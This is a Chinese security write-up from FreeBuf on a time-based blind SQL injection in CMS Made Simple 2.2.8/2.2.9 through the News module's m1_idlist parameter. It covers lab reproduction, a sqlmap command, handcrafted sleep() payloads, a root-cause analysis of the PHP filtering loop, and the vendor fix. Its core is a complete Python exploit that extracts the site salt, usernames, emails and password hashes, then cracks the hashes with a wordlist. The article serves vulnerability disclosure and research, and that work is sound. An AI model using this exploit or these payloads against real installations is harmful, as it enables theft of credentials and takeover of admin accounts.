***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **CMS Made
Simple(CMSMS)是一个简单且便捷的内容管理系统，它使用PHP、MySQL和Smarty模板引擎开发，具有基于角色的权限管理系统，基于向导的安装与更新机制，对系统资源占用少，同时包含文件管理、新闻发布以及RSS等模块。在CMS
Made Simple <=
2.2.9的版本中存在一个基于时间的SQL盲注漏洞。通过将一个精心构造的语句赋值给新闻模块中的m1_idlist参数，可以利用该SQL盲注漏洞。**

## 实验环境

1.渗透主机：Kali-Linux-2019.2-vm-i386

2.目标主机：CN_Windows7_x86_sp1

3.软件版本：CMS Made Simple 2.2.8

## 涉及工具

1.BurpSuite v1.7.36

2.python-2.7.15

3.Mozilla Firefox 60.6.2

## 漏洞复现

1\. 漏洞URL如下：“[http://server-ip/cmsms/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=](http://server-ip/cmsms/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=)”

当参数m1_idlist赋值为1时，页面显示6月19日的新闻，cmsms页面如下：

![image.png](https://image.3001.net/images/20190627/1561623934_5d147d7e19e3a.png!small)当参数m1_idlist赋值为2时，页面显示6月24日的新闻，cmsms页面如下：![image.png](https://image.3001.net/images/20190627/1561624107_5d147e2b94b44.png!small)

由此可见，当给参数m1_idlist赋予不同的值时，主页会显示不同的新闻内容，即m1_idlist对应的是新闻的ID。

2\. sqlmap扫描

2.1 获取cookie

设置Mozilla
Firefox浏览器代理为127.0.0.1:8080，用于指向BurpSuite，然后在浏览器中访问漏洞URL，再通过BurpSuite中的HTTP
history找到Cookie的详细信息，如下图所示：![image.png](https://image.3001.net/images/20190627/1561624139_5d147e4bc9ced.png!small)

2.2 结合步骤2.1中获取到的cookie，使用sqlmap对漏洞URL中的参数m1_idlist进行扫描测试，sqlmap扫描命令如下：

    
    
    sqlmap -u "http://192.168.188.140/cmsms/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=1" -p "m1_idlist" --cookie="CMSSESSID6ae120628fa8=v9rtmai3jn0bc4usje1o83c174" --dbms="MySQL" --level 3 --risk 3

2.3
等待了一段漫长的时光，sqlmap的扫描结果如下图所示（居然告诉我没有漏洞，唉，看来神器也有靠不住的时候）：![image.png](https://image.3001.net/images/20190627/1561624212_5d147e94621e9.png!small)

3\. 构造语句测试

由于神器sqlmap失准，我们直接手动构造语句来确认漏洞。

构造如下语句，拼接到参数m1_idlist之后：

    
    
    0,1))and(case+when+(select+sleep(1)+from+cms_users+limit+1)+then+1+else+2+end)+--+

首先设置sleep的参数为1s，运行结果如下图所示，可以看到服务器的响应时间为1141ms（即1.141s）：![image.png](https://image.3001.net/images/20190627/1561624361_5d147f29ed551.png!small)再次设置sleep的参数为5s，运行结果如下图所示，可以看到服务器的响应时间为5163ms（即5.163s）：
![image.png](https://image.3001.net/images/20190627/1561624381_5d147f3d16997.png!small)

当设置sleep的参数为10s时，服务器的响应时间为10184ms（即10.184s）。不断增大sleep的参数值，响应时间也在逐步增加。由此可以确定，在参数m1_idlist中存在基于时间的SQL盲注漏洞。

## 漏洞分析

通过分析源代码，我们来找出SQL注入漏洞的产生点，有关的问题代码如下图所示：![image.png](https://image.3001.net/images/20190627/1561624431_5d147f6fa58eb.png!small)

以上这段代码，在将数组中的元素强制转换成整型之后，做了一个条件判断和一个unset操作，看似对变量idlist的输入做了过滤和筛查，其实然并卵。下面通过一段测试代码来详细说明，代码如下：

    
    
    <?php
    $idlist = "0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ ";
    if( is_string($idlist) ) {
        $tmp = explode(',', $idlist);
        for ($i = 0; $i < count($tmp); $i++) {
            $tmp[$i] = (int)$tmp[$i]; 
            if( $tmp[$i] < 1 )
                unset($tmp[$i]);
        }
        $idlist = array_unique($tmp);
        foreach($idlist as $value){
            echo $value;
            echo "\n";
        }
    }
    ?>

这段测试代码的运行结果如下图所示：![image.png](https://image.3001.net/images/20190627/1561625173_5d148255cf4f4.png!small)

从上图可以看出，变量idlist中的”0”被过滤掉了，”1”和“2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+
”被保留了下来，这说明条件判断和unset语句只起到了一部分作用。

为什么会这样？在for循环中，第一次循环的时候，由于$tmp[0]<
1，因此$tmp[0]会被unset掉，那么第二次循环中的count($tmp)实际上比第一次循环少了1（少了被unset掉的$tmp[0]），所以最终$tmp[2]根本没有被强制类型转换，于是“2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+
”被保留了下来。

## 漏洞利用

1\.
SQL盲注漏洞的利用程序通过构造特定的SQL语句拼接到漏洞URL之后，然后判定MySQL的sleep时长，以此来枚举数据库中的敏感信息。该程序包含get_salt()、get_username(userid)、get_email(userid)、get_password(userid)、crack_password()、beautify_print()以及main()等组成部分。其中get_salt()函数获取由系统随机生成的salt值，用于crack_password()函数破解用户密码；get_username(userid)函数用于获取cmsms的用户名；get_email(userid)函数用于获取用户对应的邮箱；get_password(userid)函数用于获取用户对应的密码，此密码为密文；crack_password()函数结合salt值、密文密码以及自定义字典来破解用户密码。程序的详细代码如下所示：

    
    
    import requests
    from termcolor import colored
    import time
    from termcolor import cprint
    import optparse
    import hashlib
    
    url_vuln = 'http://192.168.188.140/cmsms/moduleinterface.php?mact=News,m1_,default,0&m1_idlist='
    session = requests.Session()
    dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
    
    flag = True
    password = ""
    sleep_time = 1
    username = ""
    result = ""
    email = ""
    salt = ""
    
    def get_salt():
        global flag
        global salt
        global result
        salt = ""
        ord_salt = ""
        ord_salt_temp = ""
        while flag:
            flag = False
            for i in range(0, len(dictionary)):
                temp_salt = salt + dictionary[i]
                ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
                payload = "0,1,2))+and+(select+sleep(" + str(sleep_time) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
                url = url_vuln + payload
                start_time = time.time()
                r = session.get(url)
                elapsed_time = time.time() - start_time
                if elapsed_time >= sleep_time:
                    flag = True
                    break
            if flag:
                salt = temp_salt
                ord_salt = ord_salt_temp
        flag = True
        result += '\n[+] Salt for password found: ' + salt
    	
    def get_username(userid):
        global flag
        global username
        global result
        username = ""
        ord_username = ""
        ord_username_temp = ""
        while flag:
            flag = False
            for i in range(0, len(dictionary)):
                temp_username = username + dictionary[i]
                ord_username_temp = ord_username + hex(ord(dictionary[i]))[2:]
                payload = "0,1,2))+and+(select+sleep(" + str(sleep_time) + ")+from+cms_users+where+username+like+0x" + ord_username_temp + "25+and+user_id%3d{id})+--+".format(id=userid)
                url = url_vuln + payload
                start_time = time.time()
                r = session.get(url)
                elapsed_time = time.time() - start_time
                if elapsed_time >= sleep_time:
                    flag = True
                    break
            if flag:
                username = temp_username
                ord_username = ord_username_temp
        result += '\n[+] Username found: ' + username
        flag = True
        if username:
            return True
        else:
            return False
    
    def get_email(userid):
        global flag
        global email
        global result
        email = ""
        ord_email = ""
        ord_email_temp = ""
        while flag:
            flag = False
            for i in range(0, len(dictionary)):
                temp_email = email + dictionary[i]
                ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
                payload = "0,1,2))+and+(select+sleep(" + str(sleep_time) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id%3d{id})+--+".format(id=userid)
                url = url_vuln + payload
                start_time = time.time()
                r = session.get(url)
                elapsed_time = time.time() - start_time
                if elapsed_time >= sleep_time:
                    flag = True
                    break
            if flag:
                email = temp_email
                ord_email = ord_email_temp
        result += '\n[+] Email found: ' + email
        flag = True
    	
    def get_password(userid):
        global flag
        global password
        global result
        password = ""
        ord_password = ""
        ord_password_temp = ""
        while flag:
            flag = False
            for i in range(0, len(dictionary)):
                temp_password = password + dictionary[i]
                ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
                payload = "0,1,2))+and+(select+sleep(" + str(sleep_time) + ")+from+cms_users"
                payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id%3d{id})+--+".format(id=userid)
                url = url_vuln + payload
                start_time = time.time()
                r = session.get(url)
                elapsed_time = time.time() - start_time
                if elapsed_time >= sleep_time:
                    flag = True
                    break
            if flag:
                password = temp_password
                ord_password = ord_password_temp
        flag = True
        result += '\n[+] Password found: ' + password
    
    def crack_password():
        global password
        global result
        global salt
        dict = open("C:/Users/Nero/Desktop/pass1000.txt")
        for line in dict.readlines():
            line = line.replace("\n", "")
            if hashlib.md5(str(salt) + line).hexdigest() == password:
                result += "\n[+] Password cracked: " + line
                break
        dict.close()
    
    def beautify_print():
        global result
        cprint(result,'green', attrs=['bold'])
    
    def main():
        global result
        for i in range(1, 10):
            get_salt()
            user_exist = get_username(i)
            if user_exist:
                get_email(i)
                get_password(i)
                crack_password()
                beautify_print()
                result = ""
            else:
                break
    
    main()

2\.
通过命令main()来调用main函数，运行该SQL盲注漏洞利用程序，结果如下：![image.png](https://image.3001.net/images/20190627/1561625431_5d148357953ac.png!small)可以看到获取到了全部用户的salt值、用户名、Email以及密码密文和明文，与MySQL数据库中记录的内容完全一致，数据库信息详见下图：
![image.png](https://image.3001.net/images/20190627/1561625447_5d148367b6768.png!small)![image.png](https://image.3001.net/images/20190627/1561625453_5d14836dbd7ef.png!small)

3\. 使用获取到的用户名和密码可以成功登录cmsms。

## 漏洞修复

针对该版本号的SQL注入漏洞，建议及时将CMS Made Simple更新到
2.2.10版本。在2.2.10版本中，对问题代码进行了修复，修复后的代码如下：![image.png](https://image.3001.net/images/20190627/1561625479_5d148387d2e92.png!small)

修复后的代码与之前的问题代码相比较，主要有三处改动：一、在将变量idlist的值分解为数组赋值给变量tmp之后，idlist被置为空；二、新增变量val，用于将强制类型转换后的数据传递给idlist；改变if语句判断条件和操作，防止发生count($tmp)-1和重复字符的操作。

通过下面的这段测试代码，可以很直观的看到效果：

    
    
    <?php
    $idlist = "0,1,2))and(case+when+(select+sleep(10)+from+cms_users+limit+1)+then+1+else+2+end)+--+ ";
    if( is_string($idlist) ) {
        $tmp = explode(',', $idlist);
        $idlist = [];
        for ($i = 0; $i < count($tmp); $i++) {
            $val = (int)$tmp[$i];
            if ($val > 0 && !in_array($val, $idlist))
                $idlist[] = $val;
        }
        foreach($idlist as $value){
            echo $value;
            echo "\n";
        }
    ?>

这段测试代码的运行结果如下图所示：![image.png](https://image.3001.net/images/20190627/1561625638_5d14842654eb9.png!small)从上图中，我们可以看到，变量idlist的值被过滤后只剩下合规的”1”和”2”，其他的字符串都被滤掉了，这样基于时间的SQL盲注漏洞也就被修复了。

***本文作者：Neroqi，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

